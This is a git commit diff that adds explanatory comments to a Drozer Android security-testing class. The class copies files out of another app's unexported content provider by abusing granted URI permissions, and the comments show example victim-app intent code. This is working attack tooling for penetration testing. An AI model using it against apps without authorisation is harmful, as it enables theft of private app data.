c186a9dc7e041ec466100dc664d5acebf37f6d97
Ken Gannon <yogehi@gmail.com>
2022-07-12 04:07:49 -0400

    Update IntentProxyToContentProvider.java

--- agent/src/main/java/com/mwr/dz/helpers/IntentProxyToContentProvider.java
+++ agent/src/main/java/com/mwr/dz/helpers/IntentProxyToContentProvider.java
@@ -12,23 +12,37 @@ import java.io.InputStream;
 
 public class IntentProxyToContentProvider extends Activity {
     
-    String filename = "yayoutputyay";
+    // This class is meant to help download files from unexported Content Providers
+    // Assuming the unexported Content Provider has GrantURIPermissions set to True
+    // Make sure the victim app is calling this activity
+    // 
+    // Example of what the victim app should be doing:
+    // Intent intent = new Intent();
+    // intent.setComponent(new ComponentName("com.mwr.dz", "com.mwr.dz.helpers.IntentProxyToContentProvider");
+    // intent.setFlags(195);
+    // intent.setData(Uri.parse("content://<unexported content provider>");
+    // startActivity(intent);
+    //
+    // Any file downloaded will be saved to Drozer's private file directory
+    // /data/data/com.mwr.dz/files/<file>
+    
+    String filename = "yayoutputyay"; // save file as "yayoutputyay"
 
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        Uri uri = Uri.parse(getIntent().getDataString());
+        Uri uri = Uri.parse(getIntent().getDataString()); // Get the Uri for the unexported content provider
         if (getIntent().getStringExtra("filename") != null) {
-            filename = getIntent().getStringExtra("filename");
+            filename = getIntent().getStringExtra("filename"); // if intent has String extra "filename", save file as this name
         }
         try {
-            InputStream input = getContentResolver().openInputStream(uri);
-            File file = new File(getFilesDir(), filename);
-            FileOutputStream output = new FileOutputStream(file);
+            InputStream input = getContentResolver().openInputStream(uri); // Reach out to the unexported Content Provider
+            File file = new File(getFilesDir(), filename); // make local file
+            FileOutputStream output = new FileOutputStream(file); // also make local file
             try {
                 byte[] buf = new byte[1024];
                 int len;
                 while ((len = input.read(buf)) > 0) {
-                    output.write(buf, 0, len);
+                    output.write(buf, 0, len); // write local file from the file pulled from content provider
                 }
             } catch (Exception e) {
                 e.printStackTrace();
